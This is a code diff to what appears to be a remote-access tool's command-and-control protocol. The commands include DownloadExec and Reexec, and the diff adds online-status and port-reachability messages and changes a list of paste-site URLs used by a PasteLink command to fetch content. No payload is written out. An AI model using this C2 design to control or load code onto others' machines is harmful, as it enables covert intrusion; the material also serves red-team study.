@@ -16,6 +16,7 @@ import StringIO
 import socket
 import psutil
 import os
+from network.lib import online
 
 def from_bytes(bytes):
     return sum(ord(byte) * (256**i) for i, byte in enumerate(bytes))
@@ -189,12 +190,18 @@ class CheckConnect(Command):
     @staticmethod
     def unpack(data):
         host, port_start, port_end = struct.unpack_from('IHH', data)
+
+        host = netaddr.IPAddress(host)
         return CheckConnect(
             host, port_start, port_end
         ), struct.calcsize('IHH')
 
-    def __init__(self, host, port_start, port_end=None):
-        self.host = netaddr.IPAddress(host)
+    def __init__(self, host, port_start, port_end):
+        try:
+            self.host = netaddr.IPAddress(host)
+        except:
+            self.host = netaddr.IPAddress(socket.gethostbyname(host))
+
         self.port_start = port_start
         self.port_end = None if port_end == 0 else port_end
 
@@ -327,18 +334,11 @@ class SystemInfo(Command):
             else:
                 self.external_ip = netaddr.IPAddress(external_ip)
         else:
-            try:
-                proxy = urllib2.ProxyHandler()
-                opener = urllib2.build_opener(proxy)
-                opener.addheaders = [('User-agent', 'curl/7.50.0')]
-                response = opener.open('http://ifconfig.co', timeout=5)
-                if response.code == 200:
-                    self.external_ip = netaddr.IPAddress(response.read().strip())
-                    self.internet = True
-            except Exception, e:
-                self.external_ip = None
-                self.internet = False
-
+            self.external_ip = online.external_ip()
+            if self.external_ip:
+                self.internet = True
+            else:
+                self.internet = online.online()
 
     def pack(self):
         # 3 bits for system, 3 bits for arch, 1 bit for internet
@@ -626,37 +626,41 @@ class PasteLink(Command):
         base64.b64decode,
         base64.b64encode,
     ), (
-        'http://beta.pastee.com/api/get/{}/raw',
-        lambda x: to_bytes(baseconv.base62.decode(x)),
-        lambda x: baseconv.base62.encode(from_bytes(x)),
+        'https://phpaste.sourceforge.io/demo/paste.php?download&id={}',
+        lambda x: to_bytes(x),
+        lambda x: str(from_bytes(x)),
     ), (
         'http://ix.io/{}',
         lambda x: to_bytes(baseconv.base62.decode(x)),
         lambda x: baseconv.base62.encode(from_bytes(x)),
     ), (
-        'http://paste.ee/r/{}',
-        lambda x: to_bytes(baseconv.base62.decode(x)),
-        lambda x: baseconv.base62.encode(from_bytes(x)),
+        'https://ghostbin.com/paste/{}/download',
+        lambda x: to_bytes(baseconv.base32.decode(x)),
+        lambda x: baseconv.base32.encode(from_bytes(x)),
     ), (
         'https://hastebin.com/raw/{}',
         lambda x: to_bytes(baseconv.base62.decode(x)),
         lambda x: baseconv.base62.encode(from_bytes(x)),
     ), (
-        'http://pastie.org/pastes/{}/download',
-        lambda x: to_bytes(long(x)),
-        lambda x: str(from_bytes(x)),
+        'http://vpaste.net/{}',
+        lambda x: to_bytes(baseconv.base62.decode(x)),
+        lambda x: baseconv.base62.encode(from_bytes(x)),
     ), (
         'http://dpaste.com/{}.txt',
         lambda x: to_bytes(baseconv.base62.decode(x)),
         lambda x: baseconv.base62.encode(from_bytes(x)),
     ), (
-        'http://climbi.com/static/{}-0.txt',
+        'http://paste.openstack.org/raw/{}/',
         lambda x: to_bytes(long(x)),
         lambda x: str(from_bytes(x)),
     ), (
         'https://friendpaste.com/{}/raw',
         lambda x: to_bytes(baseconv.base62.decode(x)),
         lambda x: baseconv.base62.encode(from_bytes(x)),
+    ), (
+        'http://lpaste.net/raw/{}',
+        lambda x: to_bytes(long(x)),
+        lambda x: str(from_bytes(x)),
     )]
 
     well_known_paste_services_encode = {
@@ -730,6 +734,78 @@ class PasteLink(Command):
             length = h1 & 31
             return PasteLink(data[1:length+1], action), 1+length
 
+class OnlineStatus(Command):
+    @staticmethod
+    def unpack(data):
+        return OnlineStatus(*struct.unpack_from('>I', data)), 4
+
+    def __init__(self, register=None):
+        self.register = online.check() if register is None else register
+
+    def pack(self):
+        return struct.pack('>I', self.register)
+
+    def get_dict(self):
+        return online.bits_to_dict(self.register)
+
+    def __str__(self):
+        return '{{ONLINE: {}}}'.format(' '.join(
+            '{}={}'.format(k.upper(), v if (type(v) == bool) else any([
+                x for x in v.itervalues()
+            ])) for k,v in self.get_dict().iteritems()))
+
+class PortQuizPort(Command):
+    @staticmethod
+    def unpack(data):
+        ports_count, = struct.unpack_from('B', data)
+        ports = struct.unpack_from('>' + 'H'*ports_count, data[1:])
+        return PortQuizPort(ports), 1 + ports_count*2
+
+    def __init__(self, ports):
+        self.ports = [ int(x) for x in ports ]
+
+    def pack(self):
+        ports_count = len(self.ports)
+        ports = struct.pack('>' + 'H'*ports_count, *self.ports)
+        ports_count = struct.pack('B', ports_count)
+        return ports_count + ports
+
+    def __str__(self):
+        return '{{PORTQUIZ: {}}}'.format(','.join(str(x) for x in sorted(self.ports)))
+
+class OnlineStatusRequest(Command):
+    @staticmethod
+    def unpack(data):
+        return OnlineStatusRequest(), 0
+
+    def __repr__(self):
+        return '{ONLINE-STATUS-REQUEST}'
+
+class ConnectablePort(Command):
+    @staticmethod
+    def unpack(data):
+        ip, ports_count = struct.unpack_from('>IB', data)
+        ports = struct.unpack_from('>'+'H'*ports_count, data[5:])
+        ip = netaddr.IPAddress(ip)
+        return ConnectablePort(ip, ports), 4 + 1 + ports_count*2
+
+    def __init__(self, ip, ports):
+        try:
+            self.ip = netaddr.IPAddress(ip)
+        except:
+            self.ip = netaddr.IPAddress(socket.gethostbyname(ip))
+
+        self.ports = ports
+
+    def pack(self):
+        ports_count = len(self.ports)
+        ports = struct.pack('>'+'H'*ports_count, *self.ports)
+        header = struct.pack('>IB', int(self.ip), ports_count)
+        return header + ports
+
+    def __str__(self):
+        return '{{OPEN: {}:{}}}'.format(self.ip, ','.join(str(x) for x in self.ports))
+
 
 class Error(Command):
     errors = [
@@ -783,12 +859,15 @@ class ParcelInvalidCommand(Exception):
         return 'Unknown command: {}'.format(command)
 
 class Parcel(object):
+    MAX_PARCEL_SIZE = 35
+
     # Explicitly define commands. In other case make break something
     commands = [
         Poll, Ack, Policy, Idle, Kex,
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
         Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus,
-        SetProxy
+        SetProxy, OnlineStatusRequest, OnlineStatus, ConnectablePort,
+        PortQuizPort
     ]
 
     commands_decode = dict(enumerate(commands))
@@ -812,10 +891,14 @@ class Parcel(object):
             chr(self.commands_encode[type(command)]) + command.pack() for command in self.commands
         ])
         crc = binascii.crc32(data)
-        return struct.pack('>i', crc) + data
+        result = struct.pack('>i', crc) + data
+        if len(result) > self.MAX_PARCEL_SIZE:
+            raise ValueError('To big parcel')
+
+        return result
 
     def __repr__(self):
-        return str(self.commands)
+        return '|PARCEL: {}|'.format(str(self.commands))
 
     @staticmethod
     def unpack(data):
@@ -827,7 +910,7 @@ class Parcel(object):
             raise ParcelInvalidPayload
 
         if not binascii.crc32(data) == crc:
-            raise ParcelInvalidCrc
+            raise ParcelInvalidCrc()
 
         while data:
             command, data = data[:1], data[1:]
